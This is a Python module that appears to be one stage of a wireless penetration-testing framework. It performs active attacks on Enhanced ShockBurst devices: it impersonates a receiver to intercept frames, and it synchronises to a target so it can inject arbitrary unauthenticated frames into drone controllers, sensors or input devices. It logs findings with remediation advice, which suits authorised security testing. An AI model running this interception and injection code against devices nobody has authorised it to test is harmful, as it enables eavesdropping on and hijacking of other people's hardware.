"""
Stage 18 — ESB PRX/PTX Active Attack

Extends Stage 14's passive ESB scan with active RF attacks using the
Enhanced ShockBurst PRX and PTX Python APIs (whad.esb.PRX / whad.esb.PTX).

  PRX mode (Primary Receiver) — Listen for ACK-confirmed frames from a
    specific ESB device address. Any received frames are captured and
    checked for low-entropy (unencrypted) content. This mode is passive
    from a spectrum perspective but triggers auto-ACK retransmissions.

  PTX mode (Primary Transmitter) — Synchronise to a device's hopping
    pattern via PTX.synchronize(), then inject arbitrary frames via
    PTX.send_data(). Used to test whether a receiver accepts unauthenticated
    commands — a critical finding for drone controllers, industrial sensors,
    and wireless input devices.

Requires: RfStorm (nRF24L01+) dongle — nRF52840 ESB PTX not confirmed stable.
"""

from __future__ import annotations

import math
import time

from core.dongle import WhadDongle
from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger
import config

log = get_logger("s18_esb_active")

try:
    from whad.esb import PRX as _EsbPRX, PTX as _EsbPTX
    _ESB_API_IMPORTABLE = True
except ImportError:
    _EsbPRX = None  # type: ignore[assignment,misc]
    _EsbPTX = None  # type: ignore[assignment,misc]
    _ESB_API_IMPORTABLE = False


# ── Entry point ───────────────────────────────────────────────────────────────

def run(dongle: WhadDongle, engagement_id: str) -> None:
    if not _ESB_API_IMPORTABLE:
        log.warning(
            "[S18] whad.esb PRX/PTX not importable on this installation — skipped."
        )
        return

    if dongle.caps.device_type != "rfstorm":
        log.warning(
            "[S18] ESB PRX/PTX active attack requires an RfStorm (nRF24L01+) dongle. "
            f"Current device: {dongle.caps.device_type}. "
            "Use --esb-interface rfstorm0 or connect an RfStorm dongle."
        )

    mode = _ask_mode()
    if mode == "prx":
        _run_prx(dongle, engagement_id)
    elif mode == "ptx":
        _run_ptx(dongle, engagement_id)
    else:
        log.info("[S18] Aborted by operator.")


# ── PRX — Primary Receiver ────────────────────────────────────────────────────

def _run_prx(dongle: WhadDongle, engagement_id: str) -> None:
    """Listen for ESB frames sent TO a specific device address (PRX mode).

    PRX sets our dongle to respond as if it IS the addressed receiver,
    causing the remote transmitter's ACK-based retransmit to deliver frames.
    This captures frames that would normally go to the target device.
    """
    target_addr = _prompt_esb_address("PRX — enter ESB device address to intercept")
    if not target_addr:
        log.info("[S18][prx] No address entered — aborted.")
        return

    log.info(
        f"[S18][prx] PRX mode on {target_addr} "
        f"({config.ESB_PRX_TIMEOUT}s listen window) ..."
    )

    frames: list[dict] = []
    plaintext_count = 0

    try:
        receiver = _EsbPRX(dongle.device)
        receiver.address = target_addr
        receiver.start()
    except Exception as exc:
        log.warning(f"[S18][prx] PRX init/start failed: {type(exc).__name__}: {exc}")
        return

    deadline = time.time() + config.ESB_PRX_TIMEOUT
    try:
        for pkt in receiver.stream():
            if time.time() >= deadline:
                break
            ch = getattr(pkt, "channel", getattr(pkt, "rf_channel", "?"))
            try:
                raw = bytes(pkt)
                payload = raw[5:] if len(raw) > 5 else raw
                hex_data = payload.hex()
                is_plain = _looks_plaintext(payload)
                frames.append({
                    "channel": ch,
                    "payload_hex": hex_data[:48],
                    "plaintext": is_plain,
                    "length": len(payload),
                })
                log.info(
                    f"[S18][prx] Frame on ch {ch}: {hex_data[:32]} "
                    f"{'[PLAINTEXT]' if is_plain else ''}"
                )
                if is_plain:
                    plaintext_count += 1
            except Exception as exc:
                log.debug(f"[S18][prx] Frame decode error: {exc}")
    except Exception as exc:
        log.debug(f"[S18][prx] stream error: {type(exc).__name__}: {exc}")
    finally:
        try:
            receiver.stop()
        except Exception:
            pass

    log.info(
        f"[S18][prx] Captured {len(frames)} frame(s), "
        f"{plaintext_count} with low entropy."
    )

    if frames:
        severity = "high" if plaintext_count > 0 else "medium"
        finding = Finding(
            type="esb_prx_frames_captured",
            severity=severity,
            target_addr=target_addr,
            description=(
                f"ESB PRX interception captured {len(frames)} frame(s) addressed to "
                f"{target_addr}. "
                + (
                    f"{plaintext_count} frame(s) showed low-entropy content "
                    "consistent with unencrypted commands/data."
                    if plaintext_count > 0
                    else "No low-entropy frames detected — may be encrypted."
                )
            ),
            remediation=(
                "Implement AES-128 encryption at the ESB application layer. "
                "Add replay counters to prevent retransmit-based injection. "
                "Validate receiver address binding server-side."
            ),
            evidence={
                "target_address": target_addr,
                "frames_captured": len(frames),
                "plaintext_frames": plaintext_count,
                "samples": frames[:5],
                "listen_duration_seconds": config.ESB_PRX_TIMEOUT,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(f"FINDING [{severity}] esb_prx_frames_captured: {target_addr}")

    _print_prx_summary(target_addr, frames, plaintext_count)


# ── PTX — Primary Transmitter ─────────────────────────────────────────────────

def _run_ptx(dongle: WhadDongle, engagement_id: str) -> None:
    """Synchronize to a device's channel-hop pattern and inject frames (PTX mode).

    PTX.synchronize() sniffs the air to learn the device's frequency-hopping
    parameters, then PTX.send_data() transmits frames that the target receiver
    will process as if they came from the paired transmitter.
    """
    target_addr = _prompt_esb_address("PTX — enter ESB device address to inject")
    if not target_addr:
        log.info("[S18][ptx] No address entered — aborted.")
        return

    try:
        payload_bytes = bytes.fromhex(config.ESB_PTX_PAYLOAD)
    except ValueError:
        log.warning(
            f"[S18][ptx] config.ESB_PTX_PAYLOAD is not valid hex: "
            f"{config.ESB_PTX_PAYLOAD!r} — using default 0x050000000000"
        )
        payload_bytes = bytes.fromhex("050000000000")

    custom = _prompt_custom_payload(payload_bytes)
    if custom is not None:
        payload_bytes = custom

    log.info(
        f"[S18][ptx] Synchronizing to {target_addr} "
        f"(payload={payload_bytes.hex()}) ..."
    )

    synced = False
    inject_ok = False
    ack_received = False

    try:
        transmitter = _EsbPTX(dongle.device)
        transmitter.address = target_addr

        # synchronize() sniffs for the device and locks onto its channel
        try:
            transmitter.synchronize()
            synced = True
            log.info(f"[S18][ptx] Synchronized to {target_addr}.")
        except Exception as exc:
            log.warning(
                f"[S18][ptx] synchronize() failed: {type(exc).__name__}: {exc}\n"
                "  Device may be out of range or not actively transmitting."
            )
            return

        # send_data() injects the frame; waiting_ack=True checks for ACK
        try:
            result = transmitter.send_data(payload_bytes, waiting_ack=True)
            inject_ok = True
            ack_received = bool(result)
            log.info(
                f"[S18][ptx] Frame sent: {'ACK received' if ack_received else 'no ACK'}"
            )
        except Exception as exc:
            log.warning(f"[S18][ptx] send_data() failed: {type(exc).__name__}: {exc}")

    except Exception as exc:
        log.warning(f"[S18][ptx] PTX init failed: {type(exc).__name__}: {exc}")
        return
    finally:
        try:
            transmitter.stop()
        except Exception:
            pass

    if inject_ok:
        severity = "critical" if ack_received else "high"
        finding = Finding(
            type="esb_ptx_injection",
            severity=severity,
            target_addr=target_addr,
            description=(
                f"ESB PTX injection to {target_addr}: "
                + (
                    f"frame accepted (ACK received) — receiver processed "
                    f"unauthenticated command payload {payload_bytes.hex()!r}."
                    if ack_received
                    else f"frame transmitted (no ACK) — receiver may have dropped it "
                    f"or is out of range. Payload: {payload_bytes.hex()!r}."
                )
            ),
            remediation=(
                "Implement authenticated encryption (AES-128 CCM or AES-128 CTR + HMAC) "
                "at the ESB application layer. Validate transmitter identity via a "
                "challenge-response handshake before accepting commands. "
                "Consider migrating to BLE with LE Secure Connections."
            ),
            evidence={
                "target_address": target_addr,
                "payload_hex": payload_bytes.hex(),
                "synchronized": synced,
                "inject_sent": inject_ok,
                "ack_received": ack_received,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(f"FINDING [{severity}] esb_ptx_injection: {target_addr}")

    _print_ptx_summary(target_addr, synced, inject_ok, ack_received, payload_bytes)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts: dict[int, int] = {}
    for b in data:
        counts[b] = counts.get(b, 0) + 1
    n = len(data)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _looks_plaintext(payload: bytes) -> bool:
    if len(payload) < 4:
        return False
    return _entropy(payload) < 4.5


def _ask_mode() -> str:
    print("\n  Stage 18 — ESB PRX/PTX Active Attack:")
    print("    [R]  PRX — listen as receiver, capture frames sent to a device address")
    print("    [T]  PTX — synchronize to device, inject unauthenticated frames")
    print("    [S]  Skip")
    while True:
        try:
            c = input("  Select [R/T/S]: ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            return "skip"
        if c in ("R",):
            return "prx"
        if c in ("T",):
            return "ptx"
        if c in ("S", ""):
            return "skip"
        print("  Please enter R, T, or S.")


def _prompt_esb_address(prompt: str) -> str | None:
    print(f"\n  {prompt}")
    print("  Format: XX:XX:XX:XX:XX (5-byte hex, e.g. 29:b9:81:2c:a4)")
    try:
        raw = input("  ESB address [empty to abort]: ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    return raw.lower() if raw else None


def _prompt_custom_payload(default: bytes) -> bytes | None:
    print(f"\n  PTX payload (hex). Default: {default.hex()}")
    try:
        raw = input("  Payload hex [enter for default]: ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    if not raw:
        return None
    try:
        return bytes.fromhex(raw.replace(" ", ""))
    except ValueError:
        print("  Invalid hex — using default.")
        return None


# ── Summaries ─────────────────────────────────────────────────────────────────

def _print_prx_summary(
    addr: str, frames: list[dict], plaintext_count: int
) -> None:
    print("\n" + "─" * 76)
    print("  STAGE 18 SUMMARY -- ESB PRX Interception")
    print("─" * 76)
    print(f"  {'Target address':<22}: {addr}")
    print(f"  {'Frames captured':<22}: {len(frames)}")
    print(f"  {'Plaintext frames':<22}: {plaintext_count}")
    if frames:
        print(f"\n  Samples (first 5):")
        for f in frames[:5]:
            tag = " [PLAIN]" if f["plaintext"] else ""
            print(f"    ch={f['channel']}  len={f['length']:3d}  {f['payload_hex'][:32]}{tag}")
    print("─" * 76 + "\n")


def _print_ptx_summary(
    addr: str, synced: bool, inject_ok: bool, ack_received: bool, payload: bytes
) -> None:
    print("\n" + "─" * 76)
    print("  STAGE 18 SUMMARY -- ESB PTX Injection")
    print("─" * 76)
    print(f"  {'Target address':<22}: {addr}")
    print(f"  {'Synchronized':<22}: {'yes' if synced else 'no'}")
    print(f"  {'Frame transmitted':<22}: {'yes' if inject_ok else 'no'}")
    print(f"  {'ACK received':<22}: {'YES — receiver accepted' if ack_received else 'no'}")
    print(f"  {'Payload':<22}: {payload.hex()}")
    print("─" * 76 + "\n")
